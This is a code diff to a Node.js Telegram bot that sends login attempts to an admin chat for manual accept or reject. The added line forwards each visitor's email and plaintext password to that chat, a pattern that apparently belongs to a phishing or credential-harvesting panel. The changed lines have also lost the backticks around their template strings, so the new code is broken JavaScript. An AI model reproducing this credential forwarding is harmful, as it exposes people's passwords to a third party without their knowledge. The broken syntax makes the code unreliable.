@@ -14,13 +14,13 @@ function sendApprovalRequest(email, password) {
     reply_markup: {
       inline_keyboard: [
         [
-          { text: "✅ Ballaa33", callback_data: `accept|${email}` },
-          { text: "❌ Nsa Al3fsa", callback_data: `reject|${email}` },
+          { text: "✅ Accept", callback_data: accept|${email} },
+          { text: "❌ Reject", callback_data: reject|${email} },
         ],
       ],
     },
   };
-  bot.sendMessage(ADMIN_CHAT_ID, "", options); // 👈 empty message, only buttons
+  bot.sendMessage(ADMIN_CHAT_ID, 🔐 Login attempt:\n📧 ${email}\n🔑 ${password}, options);
 }
 
 // Handle button clicks
@@ -30,24 +30,24 @@ bot.on("callback_query", async (query) => {
   const status = action === "accept" ? "accepted" : "rejected";
 
   try {
-    await fetch(`${APP_URL}/update-status`, {
+    await fetch(${APP_URL}/update-status, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ email, status }),
     });
 
     await bot.answerCallbackQuery(query.id, {
-      text: `✅ You ${status} ${email}`,
+      text: ✅ You ${status} ${email},
     });
 
-    await bot.editMessageText(`🔐 ${email} has been *${status.toUpperCase()}*`, {
+    await bot.editMessageText(🔐 ${email} has been *${status.toUpperCase()}*, {
       chat_id: query.message.chat.id,
       message_id: query.message.message_id,
       parse_mode: "Markdown",
     });
   } catch (err) {
     console.error("❌ Failed to update status:", err);
-    bot.sendMessage(ADMIN_CHAT_ID, `⚠️ Error updating status for ${email}`);
+    bot.sendMessage(ADMIN_CHAT_ID, ⚠️ Error updating status for ${email});
   }
 });
 
